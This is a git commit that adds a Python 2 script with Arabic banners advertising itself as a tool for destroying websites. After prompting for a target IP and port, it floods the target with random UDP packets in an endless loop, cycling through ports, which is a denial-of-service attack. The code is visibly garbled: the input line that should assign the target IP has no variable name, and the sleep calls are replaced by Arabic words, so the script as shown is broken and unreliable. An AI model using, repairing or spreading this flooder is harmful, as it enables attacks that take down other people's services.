f6a093f1e31d00bf59cd67bacf3c4df4ab034d16
الكنج حمودي الاسطوره <mogsnfknsgqns@gmail.com>
2024-09-17 21:53:46 +0300

    Create SdOs.Pro.py

---
+++ SdOs.Pro.py
@@ -0,0 +1,77 @@
+print ("\033[96m")
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet SdOs.Pro.py")
+print (''' \033[92m
+
+الكنج حمودي الاسطوره لهكرز والاخترقات 
+	   /\\  ______________ \\
+      /::\\ \\ZZZZZZZZZZZZ/\\ 
+     /:/\\.\\ \\        /:/\\:\\ \\
+    /:/Z/\\:\\ \\      /:/Z/\\:\\ \\
+   /:/Z/__\\:\\ \\____/:/Z/  \\:\\ \\
+  /:/Z/____\\:\\ \\___\\/Z/    \\:\\ \\
+  \\:\\ \\ZZZZZ\\:\\ \\ZZ/\\ \\     \\:\\
+   \\:\\ \\     \\:\\ \\ \\:\\ \\     \\:\\ \\
+    \\:\\ \\     \\:\\ \\_\\;\\_\\_____\\;\\ \\
+     \\:\\ \\     \\:\\_________________\\
+      \\:\\ \\    /:/ZZZZZZZZZZZZZZZZZ/
+       \\:\\ \\  /:/Z/    \\:\\ \\  /:/Z/
+        \\:\\ \\/:/Z/      \\:\\ \\/:/Z/
+         \\:\\/:/Z/________\\;\\/:/Z/
+          \\::/Z/_______itz__\\/Z/
+           \\/ZZZZZZZZZZZZZZZZZ/
+           
+           الاصدار V2 SdOs.Pro.py
+            
+              \033[0m''')
+           
+print
+print "Coded By : SdOs.Pro.py "
+print "المطور   : المــــطور  الـــكـنج حــمـودي الاسطـورة"
+print "اقوي اده تدمير مواقع عبر الترمكس تم تطويره وصنعه من قبل الكنج حمودي الاسطوره🇾🇪 "
+print
+ = raw_input("الرجاء ادخل الايبي الموقع الستهدف  : ")
+port = input(" الرجاء ادخل المنفد الهجوم على الموقع      : ")
+os.system("clear")
+print("\033[91m")
+os.system("figlet DdoS Attack")
+print("Team : المــــطور  الـــكـنج حــمـودي الاسطـورة")
+print ("\033[92m")
+print "[                    ] 0% "
+time.جارئ التحميل (5)
+print "[=====               ] 25%"
+time.جارئ التحميل (5)
+print "[==========          ] 50%"
+time.جارئ التحميل (5)
+print "[===============     ] 75%"
+time.جارئ التحميل (5)
+print "[====================] 100%"
+time.جارئ التحميل (3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 8080:
+       port = 1
+
